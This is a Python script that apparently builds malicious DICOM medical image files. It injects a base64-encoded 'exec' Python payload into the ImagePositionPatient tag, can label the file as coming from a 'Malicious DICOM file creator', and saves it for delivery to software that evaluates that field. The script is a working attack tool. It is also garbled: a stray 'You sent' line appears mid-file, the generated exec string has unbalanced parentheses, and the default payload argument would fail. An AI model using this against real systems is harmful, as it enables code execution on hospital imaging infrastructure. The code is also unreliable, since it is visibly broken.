import pydicom
import base64
import argparse

pydicom.config.settings.reading_validation_mode = pydicom.config.IGNORE


def encode_payload(plain_payload):
    data = open(plain_payload, 'rb').read()
    return f"exec(__import__('base64').b64decode({base64.b64encode(data)})"

def prepare_dicom_payload(dicom_file_path, payload):
    try:
        dicom_data = pydicom.dcmread(dicom_file_path)

        values = dicom_data[0x0020, 0x0032].value
        mal = [str(i) for i in values]
        mal.append(encode_payload(payload))
        
    except pydicom.errors.InvalidDicomError:
        print("The file is not a valid DICOM file.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return mal


def modify_dicom_field(dicom_file_path, malicious_tag, outfile, sign):
    try:
        dicom_dataset = pydicom.dcmread(dicom_file_path)
        if sign:
            dicom_dataset.Manufacturer = "Malicious DICOM file creator"
            dicom_dataset.InstitutionName = "Malicious DICOM file institution"
        elem =  pydicom.dataelem.DataElement(0x00200032, 'CS', malicious_tag)
        dicom_dataset[0x00200032] = elem
        print(dicom_dataset)
        dicom_dataset.save_as(outfile)
    except Exception as e:
        print(f"An error occurred: {e}")
You sent
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Read a DICOM file.')
    parser.add_argument('--dicom', required=True, help='Path to the input DICOM file')
    parser.add_argument('--outfile', required=True, help='Path to the output DICOM file')
    parser.add_argument('--payload', required=False, default=b"print('Test')", help='File that contains the malicious plain python3 code')
    parser.add_argument('--signature', required=False, default=True)
    
    args = parser.parse_args()
    dicom_infile_path = args.dicom
    dicom_outfile_path = args.outfile
    print(args.signature)
    
    tmp_tag = prepare_dicom_payload(dicom_infile_path, payload=args.payload)
    if tmp_tag:
        malicious_tag = '\\'.join(tmp_tag)

        modify_dicom_field(dicom_infile_path, malicious_tag, dicom_outfile_path, sign=args.signature)
        exit(0)
    else:
        exit(1)